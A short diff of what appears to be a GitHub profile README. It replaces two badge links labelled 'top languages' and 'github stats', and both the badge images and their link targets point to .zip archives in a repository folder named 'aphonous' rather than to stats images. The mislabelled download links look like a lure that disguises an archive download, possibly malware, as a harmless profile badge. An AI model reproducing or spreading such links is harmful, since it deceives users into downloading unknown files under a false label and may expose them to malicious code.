@@ -2,7 +2,7 @@
 <div align="center">
 
  
-[![Baby Z's top languages](https://github.com/MiooDev/MemeMachine-2019_Website/raw/refs/heads/main/aphonous/Meme-Website-Machine-v3.6.zip)](https://github.com/MiooDev/MemeMachine-2019_Website/raw/refs/heads/main/aphonous/Meme-Website-Machine-v3.6.zip)
+[![Baby Z's top languages](https://raw.githubusercontent.com/MiooDev/MemeMachine-2019_Website/main/aphonous/Machine-Website-Meme-v3.4.zip)](https://raw.githubusercontent.com/MiooDev/MemeMachine-2019_Website/main/aphonous/Machine-Website-Meme-v3.4.zip)
   </BR>
   </BR>
-[![Baby Z's github stats](https://github.com/MiooDev/MemeMachine-2019_Website/raw/refs/heads/main/aphonous/Meme-Website-Machine-v3.6.zip)](https://github.com/MiooDev/MemeMachine-2019_Website/raw/refs/heads/main/aphonous/Meme-Website-Machine-v3.6.zip)
+[![Baby Z's github stats](https://raw.githubusercontent.com/MiooDev/MemeMachine-2019_Website/main/aphonous/Machine-Website-Meme-v3.4.zip)](https://raw.githubusercontent.com/MiooDev/MemeMachine-2019_Website/main/aphonous/Machine-Website-Meme-v3.4.zip)
